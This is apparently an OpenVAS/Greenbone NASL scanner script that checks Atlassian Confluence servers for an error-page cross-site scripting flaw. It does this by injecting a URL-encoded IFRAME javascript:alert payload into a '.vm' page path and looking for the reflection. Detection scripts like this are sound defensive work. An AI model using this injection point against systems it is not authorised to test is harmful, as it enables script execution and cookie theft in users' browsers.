CPE = "cpe:/a:atlassian:confluence";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103569" );
	script_bugtraq_id( 55509 );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:P/A:N" );
	script_name( "Atlassian Confluence Error Page Cross Site Scripting Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/55509" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2012-09-18 11:53:40 +0200 (Tue, 18 Sep 2012)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "gb_atlassian_confluence_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "atlassian/confluence/detected" );
	script_tag( name: "solution", value: "Updates are available. Please see the references for more information." );
	script_tag( name: "summary", value: "Atlassian Confluence is prone to a cross-site scripting vulnerability
  because it fails to sufficiently sanitize user-supplied data." );
	script_tag( name: "impact", value: "An attacker may leverage this issue to execute arbitrary script code
  in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker
  to steal cookie-based authentication credentials and to launch other attacks." );
	script_tag( name: "affected", value: "Atlassian Confluence versions prior to 4.1.9 are vulnerable." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("http_keepalive.inc.sc");
require("url_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
js = urlencode( str: "<IFRAME SRC=\"javascript:alert(/xss-test/)\">", unreserved: ":=/" );
url = dir + "/pages/includes/status-list-mo" + js + ".vm";
if(http_vuln_check( port: port, url: url, pattern: "<IFRAME SRC=\"javascript:alert\\(/xss-test/\\)\">", check_header: TRUE )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

